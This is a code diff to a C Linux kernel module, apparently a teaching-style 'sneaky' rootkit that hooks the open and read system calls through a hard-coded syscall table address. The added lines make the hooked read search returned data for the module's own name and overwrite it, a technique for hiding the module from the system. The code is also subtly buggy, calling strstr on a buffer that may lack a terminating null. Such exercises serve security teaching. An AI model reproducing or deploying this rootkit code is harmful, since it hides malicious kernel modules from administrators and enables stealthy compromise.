@@ -61,7 +61,7 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 //This is used for all system calls.
 asmlinkage int (*original_call_open)(const char *pathname, int flags);
 
-//Define our new sneaky version of the 'open' syscall
+//Define our new sneaky version of the 'open' sys_call_table
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "Open: Very, very Sneaky!\n");
@@ -87,7 +87,21 @@ asmlinkage int (*original_call_read)(int fd, void *buf, size_t count);
 asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
 {
   printk(KERN_INFO "Read: Very, very Sneaky!\n");
-  return original_call_read(fd,buf,count);
+  int nread= original_call_read(fd,buf,count);
+
+  char* pcBuf=(char*) buf; 
+
+  const char* sneakyBuff="sneaky_mod"; 
+  char* pch = strstr (buf,sneakyBuff);
+
+
+  if (pch) // contains sneaky_mod
+  {
+    printk(KERN_INFO "Performing read replacement!\n");
+    strcpy (pch,"~~~~~~");
+  }
+
+  return nread; 
 }
 
 ////////////////////////////////////////////////////////////////////////
